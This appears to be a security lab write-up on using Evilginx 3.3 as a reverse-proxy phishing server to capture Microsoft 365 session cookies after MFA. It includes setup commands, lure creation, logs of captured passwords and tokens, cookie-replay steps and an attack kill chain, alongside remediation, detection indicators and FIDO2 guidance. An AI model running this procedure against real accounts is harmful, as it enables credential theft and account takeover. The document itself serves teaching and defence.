> **English** | [Italiano](README.md)

# Evilginx - MFA Bypass via Reverse Proxy Phishing

> - **Phase:** Social Engineering - Advanced Phishing with MFA Bypass
> - **Visibility:** Medium - TLS traffic between victim and Evilginx proxy appears legitimate; however the phishing domain is detectable via Certificate Transparency logs, DNS monitoring, and double TLS handshake analysis
> - **Prerequisites:** Evilginx 3.x installed; attacker-controlled domain with DNS management (A/CNAME records); TLS certificate (automatic Let's Encrypt or manual); phishlet configured for target service (Microsoft 365, Google, Okta)
> - **Output:** SE-002 (MFA bypass via reverse proxy session hijacking - severity Critical); target service session cookie captured post complete MFA authentication

- **Operating Environment:** Kali Linux Purple (Attacker + Evilginx Server), Windows VM (Victim with browser)
- **Target:** Microsoft 365 login (simulated in lab environment)
- **Framework:** Evilginx 3.3
- **Documented Techniques:** Reverse Proxy Phishing, Session Cookie Hijacking, MFA Bypass

---

## Executive Summary

Evilginx represents the most significant evolution in the phishing landscape since 2022. While traditional phishing (GoPhish, PyPhisher) only captures username and password - making MFA an effective defense - Evilginx operates as a transparent reverse proxy between the victim and the legitimate service, intercepting session cookies issued after the completion of the entire authentication flow, including the second factor (OTP, push notification, authenticator app).

The principle is simple: the victim interacts with the real service (sees the actual Microsoft 365 interface, the real MFA challenge), but all traffic transits through the Evilginx proxy. At the end of authentication, the service issues a session cookie that Evilginx captures before forwarding it to the victim's browser. The attacker can then import this cookie into their own browser to access the account without knowing the password and without repeating MFA.

This technique has made traditional phishing kits obsolete for targets with MFA enabled, and has pushed the industry toward adopting FIDO2/WebAuthn as the only effective countermeasure.

---

## MFA Bypass: Session Cookie Hijacking via Reverse Proxy

**Finding ID:** `SE-002` | **Severity:** `Critical`

### Operational Context

The lab configured Evilginx with a phishlet for Microsoft 365, using a test domain (`login.lab.local`) with a self-signed TLS certificate. The victim (Windows VM with Chrome browser) visited the phishing URL, completed login with username + password + OTP code, and the session cookie was intercepted in real time. The attacker then imported the cookie into their own browser to access the account without further authentication.

### PoC - Phase 1: Installation and Base Configuration

```Bash
# Evilginx installation
sudo apt install evilginx2
# or build from source (recommended for version 3.x)
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo ./build/evilginx -p ./phishlets -developer
# Flag -developer: disables DNS checks for local testing
```

```Bash
# Domain and IP configuration (Evilginx console)
config domain lab.local
config ipv4 192.168.0.110
```

```
[inf] server domain set to: lab.local
[inf] server external IP set to: 192.168.0.110
```

### PoC - Phase 2: Phishlet Configuration

```Bash
# Enable Microsoft 365 phishlet
phishlets hostname o365 login.lab.local
phishlets enable o365
```

```
[inf] setting up phishlet 'o365'
[inf] hostname for phishlet 'o365' set to: login.lab.local
[inf] enabled phishlet 'o365'                                      <-- phishlet active
[inf] setting up SSL/TLS certificates for domain: login.lab.local
[inf] certificates successfully installed                           <-- TLS ready
```

### PoC - Phase 3: Lure Creation (Phishing URL)

```Bash
# Create phishing URL
lures create o365
lures edit 0 redirect_url https://outlook.office.com
lures get-url 0
```

```
https://login.lab.local/NeKzw3E                                   <-- URL to send to victim
```

### PoC - Phase 4: Victim Completes MFA Login

The victim receives the URL (via email, message, or any delivery channel) and visits it in the browser. The displayed page is the real Microsoft 365 portal - not a static copy, but the actual service proxied by Evilginx. The victim enters username, password, and completes the MFA challenge (OTP code from Authenticator app).

```
# Evilginx logs during victim authentication
[inf] [o365] new visitor: 192.168.0.120 (Windows 10, Chrome 120)
[inf] [o365] proxying request: POST /common/login                  <-- username+password
[inf] [o365] proxying request: POST /common/SAS/ProcessAuth        <-- MFA challenge
[inf] [o365] proxying request: POST /common/SAS/EndAuth            <-- MFA completed
[!!!] [o365] session captured for: user@target-lab.com             <-- SE-002
[inf] [o365] tokens captured - session cookie saved
[inf] [o365] redirecting to: https://outlook.office.com
```

### PoC - Phase 5: Session Replay

```Bash
# View captured sessions
sessions
```

```
+-----+----------+---------------------+----------+-----------------------+
| id  | phishlet | username            | tokens   | landing url           |
+-----+----------+---------------------+----------+-----------------------+
|   1 | o365     | user@target-lab.com | captured | login.lab.local/NeKzw |  <-- SE-002
+-----+----------+---------------------+----------+-----------------------+
```

```Bash
# Export session details
sessions 1
```

```
[session 1]
  phishlet:    o365
  username:    user@target-lab.com
  password:    [captured]
  tokens:
    ESTSAUTH=0.AQ4Aj...                    <-- Azure AD session cookie
    ESTSAUTHPERSISTENT=0.AQ4Aj...          <-- persistent session cookie
    ESTSAUTHLIGHT=0.AQ4Aj...
  user-agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0
  remote-ip:   192.168.0.120
  timestamp:   2026-03-15 10:23:45 UTC
```

```Bash
# Import cookie in attacker's browser:
# 1. Install "Cookie-Editor" extension in Chrome/Firefox
# 2. Navigate to https://login.microsoftonline.com
# 3. Open Cookie-Editor -> Import -> paste token JSON
# 4. Refresh page -> direct access to account without login
```

### Remediation

- **Immediate action:** revoke all refresh tokens and session tokens for the compromised user (`Revoke-AzureADUserAllRefreshToken` in PowerShell, or "Revoke sessions" in Azure AD portal); password reset; review Sign-in logs for access from anomalous IPs
- **Structural action:** migration from OTP/SMS/Push to FIDO2/WebAuthn (hardware security key - YubiKey, Titan Key); FIDO2 is the only effective countermeasure because the cryptographic challenge is bound to the real domain (`login.microsoftonline.com`) and cannot be completed through a proxy on a different domain (`login.lab.local`). Implementation of Conditional Access with device compliance (Intune), IP-based restrictions, and sign-in risk evaluation (Azure AD Identity Protection)
- **Verification:** attempt session replay after token revocation - should return redirect to login page; verify that hardware security key is required for all critical users

---

## Lab Experience

The test environment was configured with Evilginx 3.3 in developer mode (`-developer` flag) to disable DNS checks that would have required a real public domain. The `o365` phishlet was configured for the hostname `login.lab.local`, with forced DNS resolution via `/etc/hosts` file on the victim machine.

The first significant difficulty was TLS configuration. Evilginx requires a valid certificate for the phishlet domain, and in the lab environment the self-signed certificate generated a browser warning on the victim ("Your connection is not private"). In a real attack, Evilginx uses Let's Encrypt to automatically obtain valid certificates, eliminating any warning. For the lab, the warning was manually accepted to proceed with testing.

The most instructive moment of the exercise was observing the authentication flow from the perspective of Evilginx logs: every HTTP/HTTPS request between the victim and Microsoft 365 transits through the proxy, and Evilginx automatically identifies and saves session cookies based on rules defined in the phishlet. The victim has no way to distinguish the experience from a legitimate login - the interface, MFA challenge, and final redirect are all real.

A critical aspect that emerged from testing: the captured session cookie has a limited duration (typically 1-24 hours for Azure AD, configurable by the administrator). The attacker must therefore use the cookie quickly or configure an automatic refresh mechanism. In recent Evilginx versions, the `--cookie-jar` flag allows export in a format compatible with automation tools.

---

## Theoretical Analysis: Why MFA Is Not Enough

The modern web authentication model is based on an implicit assumption: the victim's browser communicates directly with the authentication service. MFA adds a second factor (OTP code, push notification, biometrics) that makes password knowledge alone insufficient. However, this model does not consider the scenario where a transparent proxy interposes itself in the communication.

Evilginx exploits a fundamental architectural weakness: session cookies issued after MFA authentication are bearer tokens - anyone who possesses them can use them, regardless of who completed the authentication. The proxy intercepts these tokens before they reach the victim's browser, saves them, and then forwards them normally. The victim accesses the service as expected; the attacker has a copy of their access.

The only truly effective countermeasure is FIDO2/WebAuthn. Unlike OTP and push notifications, FIDO2 binds the cryptographic challenge to the specific domain: the hardware security key signs a challenge that includes the site's origin (`https://login.microsoftonline.com`). If the browser is connected to a different domain (`https://login.lab.local`, the Evilginx proxy), the cryptographic signature fails and authentication cannot be completed. This principle is called "origin binding" and is the reason why major security organizations (CISA, NIST) recommend migration to FIDO2 as a priority.

---

## Real-World Scenario: Post-Exploitation Projection

> This section describes how this finding would fit into a real engagement, from both the attacker (Red Team) and defender (Blue Team) perspectives.

### Attacker Perspective (Red Team)

**Starting point:** Azure AD session cookie captured for a user with MFA enabled (SE-002). Full access to the user's email and Microsoft 365 services.

**Immediate next step:** access Outlook Web App to read sensitive emails, identify key contacts, and prepare a BEC (Business Email Compromise) attack from the compromised account.

**Projected kill chain:**

```
[SE-002] Session cookie captured (M365 access)
        |
        v
Email access -> reading sensitive emails, identifying chain of command
        |
        v
BEC (Business Email Compromise) -> sending internal emails from trusted account
        |
        v
SharePoint/OneDrive access -> exfiltration of confidential documents
        |
        v
Conditional Access bypass (trusted device) -> corporate VPN access
        |
        v
Internal network -> lateral movement via AD, Domain Admin
```

**Potential impact:** complete compromise of the user's digital identity. Session hijacking via Evilginx is particularly insidious because it bypasses the security control that most organizations consider sufficient (MFA). The attacker operates with the same permissions as the legitimate user, making detection extremely difficult without behavioral analysis (UEBA).

### Defender Perspective (Blue Team)

**IOCs to monitor:**
- Certificate Transparency logs: monitor certificate issuance for domains similar to your own (e.g., `login-company.com`, `company-portal.net`)
- Anomalous DNS: queries toward typosquatting domains of your login portal
- Sign-in logs: login from anomalous IP/geolocation immediately after a legitimate login (session replay pattern)
- Token usage patterns: session token usage from a different User-Agent or IP than the original
- Impossible travel: login from two geographically distant locations in an incompatible time window

**Immediate containment:**
- Revoke all refresh tokens and session tokens (`Revoke-AzureADUserAllRefreshToken`)
- Password reset
- Verify email forwarding rules (common post-BEC persistence IOC)
- Audit SharePoint/OneDrive files accessed in the last 72 hours
- Verify Conditional Access: access from unmanaged device should be blocked

**Hardening:**
- Migration to FIDO2/WebAuthn for all users (priority: admin, C-level, finance)
- Continuous Access Evaluation (CAE) in Azure AD: near-real-time token revocation
- Token binding: bind the session token to the specific device (feature in preview in Azure AD)
- DNS sinkholing of known Evilginx domains (threat intelligence feed)
- Certificate Transparency monitoring for your brand

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Resource Development | Acquire Infrastructure: Domains | `T1583.001` | Registration of phishing domain for Evilginx proxy (`login.lab.local`) |
| Resource Development | Obtain Capabilities: Tool | `T1588.002` | Use of Evilginx 3.x framework with Microsoft 365 phishlet |
| Initial Access | Phishing: Spearphishing Link | `T1566.002` | Sending Evilginx lure URL to victim (SE-002) |
| Execution | User Execution: Malicious Link | `T1204.001` | Victim clicks the link and completes MFA login through the proxy |
| Credential Access | Steal Web Session Cookie | `T1539` | Interception of Azure AD session cookie post-MFA authentication (SE-002) |
| Credential Access | Adversary-in-the-Middle | `T1557` | Evilginx operates as transparent proxy between victim and Microsoft 365 service |
| Defense Evasion | Use Alternate Authentication Material: Web Session Cookie | `T1550.004` | Replay of captured session cookie for access without password/MFA |
| Collection | Data from Information Repositories: Sharepoint | `T1213.002` | Access to SharePoint/OneDrive documents via hijacked session |
| Collection | Email Collection: Remote Email Collection | `T1114.002` | Reading victim's Outlook Web App mailbox |

---

> **Note:** All documented activities were conducted in a virtualized lab environment (VirtualBox, isolated NAT/Bridge network) with Evilginx in developer mode. The phishlet was configured for a local test domain, not a real Microsoft 365 service. No real user credentials or sessions were intercepted. Techniques are documented for educational purposes and awareness of the need for FIDO2/WebAuthn.
